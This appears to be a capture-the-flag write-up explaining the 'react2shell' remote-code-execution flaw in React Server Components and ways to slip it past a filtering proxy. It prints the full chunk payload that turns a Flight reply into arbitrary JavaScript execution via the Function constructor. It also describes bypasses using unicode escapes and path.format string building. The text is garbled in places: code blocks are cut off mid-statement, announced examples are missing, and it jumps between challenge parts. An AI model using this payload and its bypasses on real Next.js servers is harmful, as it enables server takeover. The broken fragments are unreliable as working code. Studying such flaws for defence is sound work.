<h2 id="The challenge" tabindex="-1">The challenge</h2>
<p>All the challenges (except for part 0) consist of 2 servers, a Next.js server and a proxy server that denies payloads that contain malicious payloads. The goal of the challenge is to somehow bypass the condition and gain RCE on every server.</p>
<h2 id="Part 0" tabindex="-1">Part 0</h2>

<h3 id="Understanding React Flight Protocol" tabindex="-1">Understanding React Flight Protocol (RFC)</h3>
<p>RFC is a serialization format used in React Server Components. This serialization format can express wider types of values and supports reference relationships between different objects.</p>
<ul>
<li>The payload consists of multiple <strong>chunks</strong>, where each chunk is a JSON object.
<ul>
<li>In Python, you can send chunks like this:</li>
</ul>
</li>
</ul>
<div class="code-block-container"><pre class="language-python"><code class="language-python code-line" data-line="118"><span class="token keyword">import</span> json<span class="token punctuation">,</span> requests

URL <span class="token operator">=</span> <span class="token string">"..."</span>

chunk1 <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"foo"</span><span class="token punctuation">:</span> <span class="token string">"bar"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
chunk2 <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"biz"</span><span class="token punctuation">:</span> <span class="token string">"baz"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>

requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>URL<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">{</span>
    <span class="token string">"0"</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> chunk1<span class="token punctuation">)</span><span class="token punctuation">,</span>

<li>You can express objects, numbers, strings, etc., just like normal JSON.</li>
<li>You can also express special values by using a string that starts with <code> $</code>.
<ul>
<li>The relevant function is <a href="https://github.com/react/react/blob/ae74234eae6ebd62f19190731278e20bc1c37d51/packages/react-server/src/ReactFlightReplyServer.js#L916">parseModelString</a>.</li>
</ul>
</li>
<li>Internally, the <code>Chunk</code> class is used to process the value. The <code>value</code> attribute of a <code>Chunk</code> instance stores the value represented by the chunk.
<ul>
<li>In this blog, <em>chunk instance</em> refers to the <code>Chunk</code> instance, and <em>chunk value</em> refers to its attribute <code>value</code>. There's a difference here so keep this in mind.</li>
</ul>
</li>
<li>Here are some examples of the special values that will be used in this blog:</li>
</ul>

<h3 id="Understanding react2shell" tabindex="-1">Understanding react2shell</h3>
<p>This is what the react2shell payload looks like.</p>
<p>Chunk 0</p>
<div class="code-block-container"><pre class="language-text"><code class="language-text code-line" data-line="156">{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": '{"then":"$B1337"}',
  "_response": {
    "_prefix": "&lt;any Javascript code>",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
</code></pre></div><p>Chunk 1</p>
<div class="code-block-container"><pre class="language-text"><code class="language-text code-line" data-line="174">"$@0"
</code></pre></div><p>Chunk 2</p>
<div class="code-block-container"><pre class="language-text"><code class="language-text code-line" data-line="180">[]
</code></pre></div><p>How does this work? Let me explain step by step.</p>
<ol>
<li>There is a bug in the <code>$1:foo:bar</code> expression that allows traversal through unsafe properties such as <code>constructor</code> and <code>__proto__</code> (see this code in <a href="https://github.com/react/react/blob/ae74234eae6ebd62f19190731278e20bc1c37d51/packages/react-server/src/ReactFlightReplyServer.js#L614"><code>getOutlinedModel</code></a>).<div class="code-block-container"><pre class="language-javascript"><code class="language-javascript code-line" data-line="187">  <span class="token keyword">let</span> value <span class="token operator">=</span> chunk<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> path<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    value <span class="token operator">=</span> value<span class="token punctuation">[</span>path<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
</code></pre></div></li>
<li>If the chunk value has a <code>then</code> property after being processed, that function is invoked with <code>this</code> bound to the value that was supplied.
<ul>
<li>This is because after <code>initializeModelChunk</code> calculates its chunk value, it calls <a href="https://github.com/react/react/blob/ae74234eae6ebd62f19190731278e20bc1c37d51/packages/react-server/src/ReactFlightReplyServer.js#L143"><code>resolve(chunk.value)</code></a>. In JavaScript, an object with a <code>then</code> function is called a <code>thenable</code> object, and the prime example of it is a <code>Promise</code> instance. The <code>resolve</code> function provided by <code>new Promise((resolve, reject) =&gt; {...})</code> calls <code>then</code> in an attempt to recursively resolve a <code>thenable</code> object.</li>
</ul>
</li>
<li><code>$1:__proto__:then</code> refers to <code>Chunk.prototype.then</code>, because the value of chunk 1 is a reference to the chunk 0 instance.</li>
<li>Hence, by setting the <code>then</code> attribute of the chunk value to <code>Chunk.prototype.then</code>, it will be invoked with <code>this</code> bound to the chunk value, instead of the chunk instance. This is equivalent to parsing a chunk instance, with all the metadata that the chunk instance holds under your control.</li>
<li>If <code>chunk.status</code> is <code>&quot;resolved_model&quot;</code>, it tries to calculate the chunk value with <code>initializeModelChunk</code>. In <a href="https://github.com/react/react/blob/ae74234eae6ebd62f19190731278e20bc1c37d51/packages/react-server/src/ReactFlightReplyServer.js#L46"><code>initializeModelChunk</code></a>, the <code>value</code> property is first decoded as JSON, and then the decoded value is processed by <code>reviveModel</code>.</li>
<li>The <code>$B</code> handler calls <code>this._response._formData.get(this._response._prefix + id)</code>. By setting <code>this._response._formData</code> to <code>$0:constructor:constructor</code> (i.e., <code>Function</code>) and <code>this._response._prefix</code> to arbitrary JavaScript code, it is possible to construct a function that results in remote code execution when invoked.</li>
<li>Finally, set the <code>then</code> property to the function created in step 6. Because the function is invoked automatically, as explained in step 2, this results in remote code execution.</li>
</ol>
<h3 id="Solving the challenge" tabindex="-1">Solving the challenge</h3>
<p>Here is the main idea for recursive JSON decoding:</p>
<ul>
<li>See that in the original payload, JSON is decoded twice: the first time when parsing the original value you have sent, and the second time when you have full control over the chunk instance.</li>
<li>If we can somehow include a string containing <code>:constructor</code> only in the second string that is parsed as JSON, it can be expressed as <code>:\u005cu0063onstructor</code>. This will bypass the WAF.</li>
</ul>
<p>So perhaps we can write something like this:</p>

<p>In part 5, you are not allowed to use the string <code>constructor</code>. Hence, we need to somehow dynamically create a string. The hint referred to <code>path.join</code>, which was a bit misleading since the function we could use was <code>path.format</code>.</p>
<p>There's <a href="https://github.com/nodejs/node/blob/99a7ef604b658c8d84457c80c7d5419b26a0b612/lib/path.js#L179">an interesting behavior</a> when <code>dir</code> and <code>root</code> are the same string. It concatenates the <code>dir</code> and <code>base</code> attributes as follows:</p>
<div class="code-block-container"><pre class="language-javascript"><code class="language-javascript code-line" data-line="578">path<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string-property property">"dir"</span><span class="token operator">:</span> <span class="token string">"foo"</span><span class="token punctuation">,</span> <span class="token string-property property">"root"</span><span class="token operator">:</span> <span class="token string">"foo"</span><span class="token punctuation">,</span> <span class="token string-property property">"base"</span><span class="token operator">:</span> <span class="token string">"bar"</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment">// return "foobar"</span>
</code></pre></div><p>I was stuck here because while I had access to <code>path.format</code>, I had no idea how I could pass an object as an argument. I missed the fact that, when <code>bound</code> is provided by the metadata, it creates a function equivalent to:</p>
<div class="code-block-container"><pre class="language-text"><code class="language-text code-line" data-line="584">resolvedFunction.bind(null, ...bounds)
</code></pre></div><p>(see <a href="https://github.com/react/react/blob/ae74234eae6ebd62f19190731278e20bc1c37d51/packages/react-server/src/ReactFlightReplyServer.js#L356">this code</a>)</p>
<p>When we get <code>path.format</code> with <code>bounds</code> set to <code>{&quot;dir&quot;: &quot;foo&quot;, ...}</code>, we get a function such that, when it is called, it returns the concatenated string.</p>
<p>How should we call the function? We can use how <code>JSON.parse</code> works to achieve that. When a non-string is sent to <code>JSON.parse</code>, it calls <code>toString</code> and parses its result. Hence, by setting <code>value</code> to an object such that <code>toString</code> is set to the bound function, the function is called and its result will be parsed as JSON.</p>
<p>I set <code>bound</code> to</p>
<div class="code-block-container"><pre class="language-text"><code class="language-text code-line" data-line="596">{

    "root": payload0,
    "base": payload1,
}
